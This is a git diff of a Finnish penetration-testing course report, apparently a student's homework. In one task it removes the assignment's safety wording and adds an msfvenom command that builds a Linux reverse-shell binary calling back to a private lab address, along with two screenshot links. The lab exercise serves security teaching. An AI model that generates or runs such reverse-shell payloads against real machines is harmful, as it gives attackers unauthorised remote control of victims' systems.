@@ -245,9 +245,19 @@ tässä osiossa hain kaikki ensin ja sitten filtteröin kaikki 1495 pois ja sain
 
 
 ## e) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
-Haittaohjelma ei saa olla automaattisesti leviävä. Msfvenom tekee tunnilla opetelluilla asetuksilla ohjelman, joka avaa reverse shellin, kun sen ajaa, mutta joka ei leviä eikä tee muutenkaan mitään itsestään.
-Raporttiin riittävät pelkät komennot haitakkeen tekemiseen, itse binääriä ei ole pakko laittaa verkkoon. Mikäli laitat binäärin verkkoon, pakkaa se salakirjoitettuun zip-pakettiin ja laita salasanaksi "infected". 
-Latauslinkin yhteydessä on oltava selkeä varoitus siitä, että binääriä ei tule ajaa oikeilla koneilla. Salasanan voit halutessasi kertoa varoitusten yhteydessä.
+
+Luodaan msfvenomilla:
+
+    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf > reverse_shell.elf
+
+![image](https://github.com/SakuKarp/Tunkeutumistestaus/assets/148875105/58575aa0-c1a1-4d08-ba63-f8462ad293fd)
+
+
+![image](https://github.com/SakuKarp/Tunkeutumistestaus/assets/148875105/e348327c-2f74-4576-8877-574feac98e2d)
+
+
+
+
 
 ## f) Asenna Windows virtuaalikoneeseen. Voi olla esimerkiksi Metasploitable 3 tai Microsoftin sivuilta saatava ilmainen kokeiluversio.
 
